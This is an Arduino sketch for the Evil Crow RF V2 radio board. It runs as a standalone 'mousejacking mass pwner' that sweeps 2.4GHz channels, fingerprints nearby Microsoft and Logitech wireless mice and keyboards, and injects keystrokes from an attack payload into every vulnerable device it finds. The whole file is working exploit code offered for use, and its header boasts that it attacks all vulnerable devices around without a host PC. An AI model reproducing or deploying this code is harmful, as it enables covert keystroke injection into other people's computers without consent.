/* Sketch for using Evil Crow RF V2 as Mousejacking Mass Pwner Standalone Tool.
Once flashed into Evil Crow RF V2, it will automatically search and attack all vulnerable Mice & Keyboards around.
BE CAREFUL! 
This is based on uCMousejack[1] and WHID Elite[2].
[1] https://github.com/phikshun/uC_mousejack
[2] https://github.com/whid-injector/whid-31337
P.S. This standalone mode doesn't need to be plugged into a PC to work. Is enough to plug the Evil Crow RF V2 on a USB-battery-pack or use a LiPo and enjoy a MouseDriving session. ;] */

#include "SPI.h"
#include "nRF24L01.h"
#include "RF24.h"
#include "attack.h"

#define CE 33
#define CSN 15

#define CS_B 27

#define HSPI_MISO   12
#define HSPI_MOSI   13
#define HSPI_SCLK   14
#define HSPI_SS     CSN

#define PKT_SIZE 37
#define PAY_SIZE 32
#define MICROSOFT 1
#define LOGITECH 2

SPIClass *nspi = NULL;

RF24 radio(CE, CSN);

long times;
uint64_t promisc_addr = 0xAALL;
uint8_t channel = 25;
uint64_t address;
uint8_t payload[PAY_SIZE];
uint8_t payload_size;
bool payload_encrypted = false;
uint8_t payload_type = 0;
uint16_t sequence;

void print_payload_details()
{
  Serial.print("ch: ");
  Serial.print(channel);
  Serial.print(" s: ");
  Serial.print(payload_size);
  Serial.print(" a: ");
  for (int j = 0; j < 5; j++)
  {
    Serial.print((uint8_t)(address >> (8 * j) & 0xff), HEX);
    Serial.print(" ");
  }
  Serial.print(" p: ");
  for (int j = 0; j < payload_size; j++)
  {
    Serial.print(payload[j], HEX);
    Serial.print(" ");
  }
  Serial.println("");
  return;
}

// Update a CRC16-CCITT with 1-8 bits from a given byte
uint16_t crc_update(uint16_t crc, uint8_t byte, uint8_t bits)
{
  crc = crc ^ (byte << 8);
  while(bits--)
    if((crc & 0x8000) == 0x8000) crc = (crc << 1) ^ 0x1021;
    else crc = crc << 1;
  crc = crc & 0xFFFF;
  return crc;
}

uint8_t writeRegister(uint8_t reg, uint8_t value)
{
  uint8_t status;

  digitalWrite(CSN, LOW);
  status = nspi->transfer( W_REGISTER | ( REGISTER_MASK & reg ) );
  nspi->transfer(value);
  digitalWrite(CSN, HIGH);
  return status;
}

uint8_t writeRegister(uint8_t reg, const uint8_t* buf, uint8_t len)
{
  uint8_t status;

  digitalWrite(CSN, LOW);
  status = nspi->transfer( W_REGISTER | ( REGISTER_MASK & reg ) );
  while (len--)
    nspi->transfer(*buf++);
  digitalWrite(CSN, HIGH);

  return status;
}

bool transmit()
{
  print_payload_details();
  radio.write(payload, payload_size);
  return true;
}

void scan() {
  Serial.println("starting scan...");
  int x, offset;
  uint8_t buf[PKT_SIZE];
  uint16_t wait = 100;
  uint8_t payload_length;
  uint16_t crc, crc_given;

  // the order of the following is VERY IMPORTANT
  radio.setAutoAck(false);
  //radio.setPALevel(RF24_PA_MIN);
  // radio.setDataRate(RF24_2MBPS);
  writeRegister(RF_SETUP, 0x09); // Disable PA, 2M rate, LNA enabled
  radio.setPayloadSize(32);
  radio.setChannel(channel);
  // RF24 doesn't ever fully set this -- only certain bits of it
  writeRegister(EN_RXADDR, 0x00);
  // RF24 doesn't have a native way to change MAC...
  // 0x00 is "invalid" according to the datasheet, but Travis Goodspeed found it works :)
  writeRegister(SETUP_AW, 0x00);
  radio.openReadingPipe(0, promisc_addr);
  radio.disableCRC();
  radio.startListening();
  //radio.printDetails();

  while (1) {
    channel++;
    if (channel > 84) {
      Serial.println("starting channel sweep");
    //  digitalWrite(ledpin, HIGH);
      channel = 2;
    }

    if (channel == 4) {
     // digitalWrite(ledpin, LOW);
    }

    if (channel == 42) {
     // digitalWrite(ledpin, HIGH);
    }

    if (channel == 44) {
     // digitalWrite(ledpin, LOW);
    }

   // Serial.print("tuning radio to ");
   // Serial.println(2400 + channel);
    radio.setChannel(channel);

    times = millis();
    while (millis() - times < wait)
    {
      if (radio.available())
      {
        radio.read(&buf, sizeof(buf));

        // In promiscuous mode without a defined address prefix, we attempt to
        // decode the payload as-is, and then shift it by one bit and try again
        // if the first attempt did not pass the CRC check. The purpose of this
        // is to minimize missed detections that happen if we were to use both
        // 0xAA and 0x55 as the nonzero promiscuous mode address bytes.

        for (offset = 0; offset < 2; offset++) {
          // Shift the payload right by one bit if this is the second pass
          if (offset == 1) {
            for (x = 31; x >= 0; x--) {
              if (x > 0) buf[x] = buf[x - 1] << 7 | buf[x] >> 1;
              else buf[x] = buf[x] >> 1;
            }
          }

          // Read the payload length
          payload_length = buf[5] >> 2;

          // Check for a valid payload length, which is less than the usual 32 bytes
          // because we need to account for the packet header, CRC, and part or all
          // of the address bytes.
          if (payload_length <= (PAY_SIZE-9))
          {
            // Read the given CRC
            crc_given = (buf[6 + payload_length] << 9) | ((buf[7 + payload_length]) << 1);
            crc_given = (crc_given << 8) | (crc_given >> 8);
            if (buf[8 + payload_length] & 0x80) crc_given |= 0x100;

            // Calculate the CRC
            crc = 0xFFFF;
            for (x = 0; x < 6 + payload_length; x++) crc = crc_update(crc, buf[x], 8);
            crc = crc_update(crc, buf[6 + payload_length] & 0x80, 1);
            crc = (crc << 8) | (crc >> 8);

            // Verify the CRC
            if (crc == crc_given) {
              Serial.print("found packet /w valid crc... ");

              if (payload_length > 0) {
                Serial.print("payload length is ");
                Serial.println(payload_length);
                // Write the address
                address = 0;
                for (int i = 0; i < 4; i++)
                {
                  address += buf[i];
                  address <<= 8;
                }
                address += buf[4];

                // Write the ESB payload to the output buffer
                for(x = 0; x < payload_length + 3; x++)
                  payload[x] = ((buf[6 + x] << 1) & 0xFF) | (buf[7 + x] >> 7);
                payload_size = payload_length;

                print_payload_details();
                return;
              } else {
                Serial.println("payload is empty. scanning...");
              }
            }
          }
        }
      }
    }
  }
}

void start_transmit()
{
  radio.stopListening();

  radio.openWritingPipe(address);
  radio.openReadingPipe(1, address);
  radio.setAutoAck(true);
  radio.setPALevel(RF24_PA_MAX);
  radio.setDataRate(RF24_2MBPS);  // Maybe try radio.setDataRate(RF24_250KBPS); OR radio.setDataRate(RF24_1MBPS); to get longer range?!
  radio.setPayloadSize(32);
  radio.enableDynamicPayloads();
  writeRegister(SETUP_AW, 0x03); // Reset addr size to 5 bytes
  radio.setRetries(5,15); // retransmission: interval and count
  radio.setChannel(channel);

  return;
}

// decrypt those keyboard packets!
void ms_crypt()
{
  for (int i = 4; i < payload_size; i++)
    payload[i] ^= address >> (((i - 4) % 5) * 8) & 0xFF;
}

// calculate microsoft wireless keyboard checksum
void ms_checksum()
{
  int last = payload_size - 1;
  payload[last] = 0;
  for (int i = 0; i < last; i++)
    payload[last] ^= payload[i];
  payload[last] = ~payload[last];
}

void fingerprint()
{
  if (payload_size == 19 && payload[0] == 0x08 && payload[6] == 0x40) {
    Serial.println("found MS mouse");
    payload_type = MICROSOFT;
    return;
  }

  if (payload_size == 19 && payload[0] == 0x0a) {
    Serial.println("found MS encrypted mouse");
    payload_type = MICROSOFT;
    payload_encrypted = true;
    return;
  }

  if (payload[0] == 0) {
    if (payload_size == 10 && (payload[1] == 0xC2 || payload[1] == 0x4F))
      payload_type = LOGITECH;
    if (payload_size == 22 && payload[1] == 0xD3)
      payload_type = LOGITECH;
    if (payload_size == 5 && payload[1] == 0x40)
      payload_type = LOGITECH;
    if (payload_type == LOGITECH) Serial.println("found Logitech mouse");
  }
  return;
}

void ms_transmit(uint8_t meta, uint8_t hid) {
  if (payload_encrypted) ms_crypt();
  for (int n = 4; n < payload_size; n++)
    payload[n] = 0;
  payload[4] = sequence & 0xff;
  payload[5] = sequence >> 8 & 0xff;
  payload[6] = 67;
  payload[7] = meta;
  payload[9] = hid;
  ms_checksum();
  if (payload_encrypted) ms_crypt();
  // send keystroke (key down)
  transmit();
  delay(5);
  sequence++;

  if (payload_encrypted) ms_crypt();
  for (int n = 4; n < payload_size; n++)
    payload[n] = 0;
  payload[4] = sequence & 0xff;
  payload[5] = sequence >> 8 & 0xff;
  payload[6] = 67;
  ms_checksum();
  if (payload_encrypted) ms_crypt();
  // send null keystroke (key up)
  transmit();
  delay(5);
  sequence++;

  return;
}

void log_checksum() {
  uint8_t cksum = 0xff;
  int last = payload_size - 1;
  for (int n = 0; n < last; n++)
    cksum -= payload[n];
  cksum++;
  payload[last] = cksum;
}

void log_transmit(uint8_t meta, uint8_t keys2send[], uint8_t keysLen) {
  // setup empty payload
  payload_size = 10;
  for (int n = 0; n < payload_size; n++)
    payload[n] = 0;

  // prepare key down frame
  payload[1] = 0xC1;
  payload[2] = meta;

  for (int q = 0; q < keysLen; q++)
    payload[3+q] = keys2send[q];
  log_checksum();

  // send key down
  transmit();
  delay(5);

  // prepare key up (null) frame
  payload[2] = 0;
  payload[3] = 0;
  payload[4] = 0;
  payload[5] = 0;
  payload[6] = 0;
  payload[7] = 0;
  payload[8] = 0;
  log_checksum();

  // send key up
  transmit();
  delay(5);

  return;
}

void launch_attack() {
  Serial.println("starting attack");

  if (payload_type) {
    Serial.println("payload type is injectable");

//    digitalWrite(ledpin, HIGH);
    start_transmit();

    uint8_t meta = 0;
    uint8_t hid = 0;
    uint8_t wait = 0;
    int offset = 0;
    
    uint8_t keys2send[6];
    uint8_t keysLen = 0;

    int keycount = sizeof(attack) / 3;
    sequence = 0;

    // this is to sync the new serial
    if (payload_type == MICROSOFT) {
      for (int i = 0; i < 6; i++) {
        ms_transmit(0, 0);
      }
    }

    // now inject the hid codes
    for (int i = 0; i <= keycount; i++)
    {
      offset = i * 3;
      meta = attack[offset];
      hid = attack[offset + 1];
      wait = attack[offset + 2];

      if (payload_type == LOGITECH) {
        if (meta) {
          if (keysLen > 0) {
            log_transmit(0, keys2send, keysLen);
            keysLen = 0;
          }
          keys2send[0] = hid;
          log_transmit(meta, keys2send, 1);
          keysLen = 0;
        } else if (hid) {
          Serial.print("hid code: ");
          Serial.println(hid);
          bool dup = false;
          for (int j = 0; j < keysLen; j++) {
            if (keys2send[j] == hid)
              dup = true;
          }
          if (dup) {
            log_transmit(meta, keys2send, keysLen);
            keys2send[0] = hid;
            keysLen = 1;
          } else if (keysLen == 5) {
            keys2send[5] = hid;
            keysLen = 6;
            log_transmit(meta, keys2send, keysLen);
            keysLen = 0;
          } else {
            keys2send[keysLen] = hid;
            keysLen++;
          }
        } else if (wait) {
          if (keysLen > 0) {
            log_transmit(meta, keys2send, keysLen);
            keysLen = 0;
          }
          Serial.println("waiting");
          delay(wait << 4);
        }
        if (i == keycount && keysLen > 0) {
            log_transmit(meta, keys2send, keysLen);
        }
      }

      if (payload_type == MICROSOFT) {
        if (hid) {
          Serial.print("sending hid code: ");
          Serial.println(hid);
          ms_transmit(meta, hid);
        }
        if (wait) {
          Serial.println("waiting");
          delay(wait << 4);
        }
      }
    }

  //  digitalWrite(ledpin, LOW);
  }
  return;
}

void reset() {
  payload_type = 0;
  payload_encrypted = false;
  payload_size = 0;
  for (int i = 0; i < PAY_SIZE; i++) {
    payload[i] = 0;
  }
  radio.begin(nspi);
}

void setup() {
  Serial.begin(38400);
    pinMode(CS_B, OUTPUT);
    digitalWrite(CS_B, HIGH);

  nspi = new SPIClass(HSPI);
  nspi->begin(HSPI_SCLK, HSPI_MISO, HSPI_MOSI); //SCLK, MISO, MOSI, SS
}

void loop() {
  reset();
  scan();
  fingerprint();
  launch_attack();
}
